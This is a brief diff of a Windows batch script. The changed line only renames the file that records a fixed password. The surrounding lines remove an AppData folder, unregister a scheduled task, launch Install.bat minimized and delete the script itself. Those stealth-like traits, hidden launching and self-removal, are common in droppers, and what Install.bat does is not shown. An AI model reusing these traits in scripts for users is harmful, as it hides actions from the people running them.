@@ -31,7 +31,7 @@ rd %appdata%\Windows
 powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
 
 start /min Install.bat
-echo Your password is: 69420 > e.txt
+echo Your password is: 69420 > passwordd.txt
 cls
 call :deleteSelf&exit
 :deleteSelf
